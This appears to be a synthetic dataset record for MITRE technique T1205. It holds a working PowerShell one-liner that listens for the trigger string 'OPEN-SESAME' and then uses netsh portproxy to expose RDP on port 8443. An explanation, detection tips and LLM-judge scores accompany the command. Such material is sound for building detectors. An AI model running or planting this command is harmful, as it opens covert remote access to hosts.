{
  "technique_id": "T1205",
  "platform": "Windows",
  "shell": "PowerShell",
  "command": "[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;$listener=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any,10443);$listener.Start();$client=$listener.AcceptTcpClient();$stream=$client.GetStream();$buf=New-Object byte[] 128;$n=$stream.Read($buf,0,$buf.Length);$msg=[Text.Encoding]::ASCII.GetString($buf,0,$n).Trim();if($msg -eq 'OPEN-SESAME'){& netsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectaddress=127.0.0.1 connectport=3389};$client.Close();$listener.Stop()",
  "explanation": "Awaits a TCP connection on 10443 and checks for the magic string 'OPEN-SESAME'. If present, it uses netsh to expose RDP via an HTTPS-looking port (8443) using portproxy to 127.0.0.1:3389. Requires elevation for portproxy.",
  "rationale_steps": [
    "Create a TCP listener on a non-standard port to receive a magic application-layer signal.",
    "Upon receiving 'OPEN-SESAME', configure a netsh portproxy to forward 8443 to local RDP.",
    "Detection: monitor netsh.exe portproxy invocations, changes to PortProxy registry keys, and anomalous listeners or sudden exposure of 8443 on hosts not running HTTPS."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1205-3c835ea5-547fb38c",
  "source_prompt_hash": "3c835ea5",
  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Well-formed PowerShell one-liner with balanced delimiters, valid separators, proper quoting, and correct .NET/command invocation syntax.",
        "semantic_score": 4,
        "semantic_justification": "Implements a TCP listener that waits for a magic-string trigger and, upon match, invokes netsh to set up an RDP port proxy consistent with T1205 signaling, though it requires admin rights and includes a TLS setting and 0.0.0.0 listenaddress that may be ineffective or unsupported on some systems.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-01T19:30:52.833448Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell command is perfectly well-formed with properly balanced parentheses, brackets, and braces, correct semicolon separators, and valid syntax for all operations including TLS configuration, TCP listener setup, stream handling, and conditional execution.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by establishing a covert listener that waits for a specific trigger phrase ('OPEN-SESAME') before executing the payload that creates a port forwarding rule to expose RDP through a less suspicious port (8443).",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T03:41:11.197588Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed PowerShell, using correct object instantiation, method calls, variable assignments, conditional logic, and the `netsh` external command with valid flags.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly aligns with T1205 by implementing a specific string ('OPEN-SESAME') as a signal over a network connection to trigger a predefined action (exposing RDP via portproxy on an HTTPS-looking port), demonstrating a clear trigger mechanism for adversary actions.",
        "combined_score": 5.0,
        "confidence": 1,
        "timestamp": "2025-10-02T03:41:22.933647Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.667,
    "llm_average_score": 4.833,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}